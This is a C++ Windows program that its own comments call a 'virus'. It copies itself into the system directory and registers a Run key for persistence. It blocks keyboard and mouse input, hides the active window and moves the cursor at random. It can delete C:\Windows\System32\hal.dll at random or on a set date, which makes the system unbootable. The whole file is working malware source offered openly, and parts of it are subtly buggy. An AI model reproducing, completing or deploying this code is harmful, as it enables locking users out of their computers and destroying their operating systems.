#include <iostream>
#include <Windows.h>
#include <time.h>

using namespace std;

// -----------------about----------------- //
//	Version: v.0.a.1
//	Author:	 Ci
// ----------------settings---------------- //
#define IsDebug true							// bool
	
#define IsSetCursor true						// bool 
#define IntervalSetCursor 20					// uint - seconds
#define IsCloseWindow false						// bool
#define OffVirusAtMomentInTimeSince1970 0		// uint64
#define IsAutoOffVirus false					// bool

//   kill windows
#define IsKillWindows false						// bool
#define IsRandomKillWindows false				// bool
#define RandomRatio	123							// uint
#define IsKillWindowsOnDate false				// bool
#define KillWindowsAtMomentInTimeSince1970 0	// uint64 - seconds


void Init() {
	// save virus and auto load
	WCHAR bstr[1024], sysdir[256];
	GetModuleFileName(NULL, bstr, sizeof(bstr) / sizeof(bstr[0])); // get file name
	GetSystemDirectory(sysdir, sizeof(sysdir)); // get system dir
	CopyFile(bstr, sysdir, false); // copy virus in system dir
	WCHAR fn[256];

	int32_t i = 0, n = 0;
	for (i = 1024; ((bstr[i] != '\\') && (bstr[i] != '/')) && i >= 0; --i);
	while (bstr[++i] != '\0')
	{
		fn[n] = bstr[i];
		n++;
	}
	HKEY key;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, (WCHAR *)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_WRITE, &key);
	RegSetValueEx(key, fn, 0, REG_SZ, (BYTE *)sysdir, 256);
	RegCloseKey(key);
}

void Kill_Windows() {
	remove("C:\\Windows\\System32\\hal.dll");  // remove "hal.dll" 
}

int main() {
	// --------value--------- //
	uint64_t timer_1 = time(nullptr); // timer value
	// ------- const--------- //
	const uint16_t screenX = GetSystemMetrics(SM_CXSCREEN); // get screen size X
	const uint16_t screenY = GetSystemMetrics(SM_CXSCREEN); // get screen size Y
	// ---------------------- //

	if (IsAutoOffVirus && time(nullptr) >= OffVirusAtMomentInTimeSince1970) return 0; // auto off virus

	if (IsDebug) std::cout << "Started.....\nDebug mode"; // message
	if (!IsDebug) FreeConsole(); // console off
	if (IsDebug) Beep(1000, 100); // b-eee-p :)
	if (IsDebug) Sleep(5000); 
	if (IsDebug) Beep(1000, 100); // b-eee-p :)
	// if (!IsDebug) Init();
	if (!IsDebug && IsKillWindows && IsRandomKillWindows && !((rand() % 1000) % RandomRatio)) Kill_Windows();
		
	while(true) {
		HWND window = GetForegroundWindow();  // get window (active) foreground

		if (!IsDebug && IsCloseWindow) ShowWindow(window, SW_HIDE);  
		if (!IsDebug) BlockInput(true);

		if (!IsDebug && IsKillWindows && IsKillWindowsOnDate && time(nullptr) >= KillWindowsAtMomentInTimeSince1970) Kill_Windows();

		if (time(nullptr) - timer_1 >= IntervalSetCursor && IsSetCursor && !IsDebug) {
			timer_1 = time(nullptr);
			SetCursorPos(rand() % screenX, rand() % screenY);
		}
	}
	Beep(1000, 100);
	return 0;
}